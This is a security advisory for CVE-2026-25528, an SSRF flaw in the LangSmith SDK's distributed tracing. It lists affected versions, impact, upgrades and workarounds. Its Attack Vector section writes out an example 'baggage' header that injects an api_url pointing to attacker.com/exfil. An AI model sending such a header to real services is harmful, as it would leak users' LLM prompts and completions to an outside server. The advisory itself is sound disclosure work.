# [M] LangSmith Client SDK Affected by Server-Side Request Forgery via Tracing Header Injection

## Summary
Severity: Medium
Advisory: GHSA-v34v-rq6j-cj6p
CVE: CVE-2026-25528
CWE: CWE-918
Ecosystem: PyPI, npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2026-02-09
Source: https://github.com/advisories/GHSA-v34v-rq6j-cj6p
Type: github-advisory

## Affected
- PyPI: `langsmith` — affected >=0.4.10 <0.6.3
- npm: `langsmith` — affected >=0.3.41 <0.4.6

## Details
## Summary

The LangSmith SDK's distributed tracing feature is vulnerable to Server-Side Request Forgery via malicious HTTP headers. An attacker can inject arbitrary `api_url` values through the `baggage` header, causing the SDK to exfiltrate sensitive trace data to attacker-controlled endpoints.

---

## Description

When using distributed tracing, the SDK parses incoming HTTP headers via `RunTree.from_headers()` in Python or `RunTree.fromHeaders()` in Typescript. The `baggage` header can contain replica configurations including `api_url` and `api_key` fields.

Prior to the fix, these attacker-controlled values were accepted without validation. When a traced operation completes, the SDK's `post()` and `patch()` methods send run data to all configured replica URLs, including any injected by an attacker.

---

## Attack Vector

1. Attacker sends an HTTP request to a vulnerable service with a malicious `baggage` header:
   ```
   baggage: langsmith-replicas=[{"api_url":"https://attacker.com/exfil","project_name":"x"}]
   ```

2. The service parses the header via `RunTree.from_headers()`, storing the attacker's URL

3. When the traced operation completes, the SDK sends the full run data (including LLM inputs, outputs, and metadata) to `https://attacker.com/exfil`

---

## Impact

- **Data Exfiltration:** Sensitive trace data including LLM prompts, completions, and application metadata sent to attacker-controlled servers
- **SSRF:** Ability to make the server send requests to arbitrary URLs, potentially targeting internal services

---

## Affected Use Cases

Applications are vulnerable if they:
- Use `TracingMiddleware` to automatically propagate tracing context
- Call `RunTree.from_headers()` / `RunTree.fromHeaders()` with untrusted HTTP headers

---

## Remediation

Update to the patched versions:
- **Python:** `pip install langsmith>=0.6.3`
- **JavaScript:** `npm install langsmith@>=0.4.6`

The fix filters incoming replica configurations to an allowlist of safe fields, removing `api_url`, `api_key`, and other credential fields.

---

## Workarounds

If unable to upgrade immediately:
- Strip or validate the `baggage` header before passing to `from_headers()`
- Do not use `TracingMiddleware` with untrusted traffic

## References
- https://github.com/langchain-ai/langsmith-sdk/security/advisories/GHSA-v34v-rq6j-cj6p
- https://nvd.nist.gov/vuln/detail/CVE-2026-25528
- https://github.com/langchain-ai/langsmith-sdk
